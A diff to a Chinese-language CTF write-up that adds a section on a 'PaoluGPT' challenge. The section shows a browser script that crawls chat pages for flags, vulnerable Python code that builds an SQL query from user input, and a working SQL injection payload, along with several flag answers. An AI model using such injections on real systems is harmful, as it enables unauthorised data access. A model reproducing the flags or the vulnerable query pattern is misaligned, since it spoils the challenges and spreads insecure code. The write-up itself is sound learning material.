@@ -17,11 +17,11 @@ enableGitalk = true
 并且所有输入框需要输入的内容都在冒号后面，因此考虑用 JavaScript 来填写所有输入框。从元素的 `placeholder` 属性中读取提示，然后利用 `.split()` 来分割并提取冒号后的内容。最后填写到输入框中。
 
 ```JavaScript
-list = document.getElementsByClassName("input-box")
+list = document.getElementsByClassName("input-box");
 for (let box of list) {
-  hint = box.placeholder
-  word = hint.split(/[：:]/)[1].trim()
-  box.value = word
+  hint = box.placeholder;
+  word = hint.split(/[：:]/)[1].trim();
+  box.value = word;
 }
 ```
 
@@ -141,12 +141,12 @@ function chooseAnswer(choice) {
 
 `state` 对象可以在浏览器中访问，因此考虑编写 JavaScript 代码，读取题目并将答案写入一个列表中，最后调用 `submit()`：
 ```JavaScript
-answers = []
+answers = [];
 for (i = 0; i < 100; i++) {
-    ans = state.values[i][0] > state.values[i][1] ? '>' : '<'
-    answers.push(ans)
+    ans = state.values[i][0] > state.values[i][1] ? '>' : '<';
+    answers.push(ans);
 }
-submit(answers)
+submit(answers);
 ```
 
 在游戏开始后，在浏览器中运行这段代码即可得到 Flag。
@@ -186,5 +186,62 @@ Flag 为 `flag{!-4M-7he-hACk3r-k!Ng-OF-cOmP@r!n9-nuM63R5-Z024}`。
 
 最后请求 `/execute?cmd=our_cmd`，即可成功执行我们构造的指令，获取 Flag。
 
-Flag 为 `flag{n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_327578b540}`
+Flag 为 `flag{n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_327578b540}`。
 
+## PaoluGPT
+### 千里挑一
+第一感觉是 Flag 会藏在所有的聊天记录中。由于一个一个看实在是太麻烦了，因此用 JavaScript 自动化访问所有聊天记录页面，并检查页面中是否存在 `flag` 字符串：
+```JavaScript
+links = document.getElementsByTagName("a");
+(async () => {
+  for (let link of links) {
+  	url = link.href;
+  	resp = await fetch(url);
+  	text = await resp.text();
+  	if (text.search("flag") != -1) {
+      console.log(url);
+    }
+	}
+})()
+console.log("Getting executed...")
+```
+
+在 Console 中执行这段代码，等待一段时间。它应该会输出包含了 `flag` 字符串的页面的 URL。进入这个页面查找 `flag` 字符串，即可在页面底部找到第一个 Flag。
+
+Flag 为 `flag{zU1_xiA0_de_11m_Pa0lule!!!_7c2b2aa451}`。
+
+### 窥视未知
+这道题目还给了题目附件，而附件中是这道题目的服务器上运行的 Python 代码。观察这段代码可以看到：
+```python
+@app.route("/list")
+def list():
+    results = execute_query("select id, title from messages where shown = true", fetch_all=True)
+    messages = [Message(m[0], m[1], None) for m in results]
+    return render_template("list.html", messages=messages)
+
+@app.route("/view")
+def view():
+    conversation_id = request.args.get("conversation_id")
+    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
+    return render_template("view.html", message=Message(None, results[0], results[1]))
+```
+
+`/list` 请求会在 `message` 表中请求所有的 `shown` 为 `true` 的聊天记录，并将用它们的 id 和标题渲染一个页面展示出来。这也暗示了，在 `message` 中还存在 `shown` 为 `false` 的聊天记录。
+
+`/view` 请求直接将 `conversation_id` 参数插入了 SQL 请求中，并且没有经过任何过滤。所以可以使用 SQL 注入来查找 `shown` 为 `false` 的聊天记录。
+
+构造一个字符串使得 SQL 语句的字符串部分提前结束，在条件中添加 `or shown = false`，并注释掉后面的单引号：
+```plaintext
+' or shown = false /*
+```
+
+这样完成后的 SQL 语句应该是这样的：
+```SQL
+select title, contents from messages where id = '' or shown = false /*'
+```
+
+最后请求 `/view?conversation_id=' or shown = false /*` 即可进入被隐藏的聊天记录页面中。进入这个页面查找 `flag` 字符串，即可在页面底部找到第二个 Flag。
+
+Flag 为 `flag{enJ0y_y0uR_Sq1_&_1_would_xiaZHOU_hUI_guo_6e62416061}`。
+
+## 强大的正则表达式
